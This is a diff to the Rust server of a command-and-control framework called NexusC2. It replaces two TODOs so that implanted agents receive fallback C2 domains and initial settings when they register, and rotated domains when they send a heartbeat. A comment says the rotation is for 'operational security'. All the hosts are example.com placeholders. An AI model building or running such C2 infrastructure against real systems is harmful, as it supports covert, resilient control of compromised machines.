@@ -283,8 +283,27 @@ impl nexus_c2_server::NexusC2 for NexusC2Service {
             agent_id: agent_id.clone(),
             success: true,
             message: "Agent registered successfully".to_string(),
-            assigned_domains: vec![], // TODO: Provide fallback domains
-            config: None,             // TODO: Provide initial configuration
+            assigned_domains: vec![
+                "primary.example.com".to_string(),
+                "backup1.example.com".to_string(),
+                "backup2.example.com".to_string(),
+            ], // Fallback C2 domains for redundancy
+            config: Some(ConfigUpdate {
+                c2_domains: vec![
+                    "primary.example.com".to_string(),
+                    "backup1.example.com".to_string(),
+                ],
+                heartbeat_interval: 30, // 30 seconds
+                max_retry_attempts: 3,
+                settings: {
+                    let mut settings = std::collections::HashMap::new();
+                    settings.insert("debug_mode".to_string(), "false".to_string());
+                    settings.insert("max_tasks_per_request".to_string(), "10".to_string());
+                    settings.insert("file_chunk_size".to_string(), "65536".to_string());
+                    settings
+                },
+                certificate_update: None, // Certificate updates handled separately
+            }),
         };
 
         info!("Agent {} registered successfully", agent_id);
@@ -329,8 +348,21 @@ impl nexus_c2_server::NexusC2 for NexusC2Service {
             let response = HeartbeatResponse {
                 success: true,
                 heartbeat_interval: 30, // 30 seconds
-                new_domains: vec![],    // TODO: Provide domain rotation
-                config_update: None,
+                new_domains: vec![
+                    "rotated1.example.com".to_string(),
+                    "rotated2.example.com".to_string(),
+                ], // Domain rotation for operational security
+                config_update: Some(ConfigUpdate {
+                    c2_domains: vec![
+                        "rotated1.example.com".to_string(),
+                        "rotated2.example.com".to_string(),
+                        "backup.example.com".to_string(),
+                    ],
+                    heartbeat_interval: 30,
+                    max_retry_attempts: 3,
+                    settings: std::collections::HashMap::new(),
+                    certificate_update: None,
+                }),
             };
 
             Ok(Response::new(response))
